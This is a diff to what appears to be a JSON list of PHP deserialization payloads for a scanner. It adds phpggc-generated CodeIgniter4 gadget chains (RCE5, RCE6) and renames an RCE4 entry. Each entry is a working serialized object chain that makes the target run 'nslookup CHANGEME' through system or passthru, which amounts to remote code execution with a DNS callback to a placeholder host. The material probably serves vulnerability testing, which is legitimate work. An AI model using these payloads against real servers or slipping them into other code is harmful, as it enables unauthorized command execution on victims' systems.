@@ -37,9 +37,21 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "CodeIgniter ? (4)",
+    "name": "CodeIgniter 4.0.0-beta.1 <= 4.0.0-rc.4 (4)",
     "gen_with": "./phpggc CodeIgniter4/RCE4 <function> <parameter>",
     "payload": "O:39:\"CodeIgniter\\Cache\\Handlers\\RedisHandler\":1:{s:5:\"redis\"%3BO:45:\"CodeIgniter\\Session\\Handlers\\MemcachedHandler\":2:{s:7:\"lockKey\"%3Bs:9:\"Firebasky\"%3Bs:9:\"memcached\"%3BO:20:\"Faker\\ValidGenerator\":3:{s:12:\"%00*%00generator\"%3BO:22:\"Faker\\DefaultGenerator\":1:{s:10:\"%00*%00default\"%3Bs:63:\"nslookup CHANGEME\"%3B}s:12:\"%00*%00validator\"%3Bs:6:\"system\"%3Bs:13:\"%00*%00maxRetries\"%3Bi:1%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "CodeIgniter ? (5)",
+    "gen_with": "./phpggc CodeIgniter4/RCE5 <function> <parameter>",
+    "payload": "O:34:\"Predis\\Connection\\StreamConnection\":1:{s:13:\"%00*%00parameters\"%3BO:25:\"CodeIgniter\\Entity\\Entity\":1:{s:10:\"%00*%00datamap\"%3Ba:1:{s:10:\"persistent\"%3BO:40:\"Symfony\\Component\\HttpFoundation\\Request\":2:{s:6:\"server\"%3BO:61:\"Symfony\\Component\\DependencyInjection\\Argument\\ServiceLocator\":2:{s:73:\"%00Symfony\\Component\\DependencyInjection\\Argument\\ServiceLocator%00serviceMap\"%3Ba:1:{s:14:\"REQUEST_METHOD\"%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:70:\"%00Symfony\\Component\\DependencyInjection\\Argument\\ServiceLocator%00factory\"%3Bs:14:\"call_user_func\"%3B}s:7:\"cookies\"%3Ba:1:{s:3:\"key\"%3Bs:5:\"value\"%3B}}}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "CodeIgniter ? (6)",
+    "gen_with": "./phpggc CodeIgniter4/RCE6 <function> <parameter>",
+    "payload": "O:34:\"Predis\\Response\\Iterator\\MultiBulk\":3:{s:11:\"%00*%00position\"%3Bi:0%3Bs:7:\"%00*%00size\"%3Bi:1%3Bs:46:\"%00Predis\\Response\\Iterator\\MultiBulk%00connection\"%3BO:20:\"Faker\\ValidGenerator\":3:{s:12:\"%00*%00generator\"%3BO:22:\"Faker\\DefaultGenerator\":1:{s:10:\"%00*%00default\"%3Bs:63:\"nslookup CHANGEME\"%3B}s:13:\"%00*%00maxRetries\"%3Bi:1%3Bs:12:\"%00*%00validator\"%3Bs:8:\"passthru\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
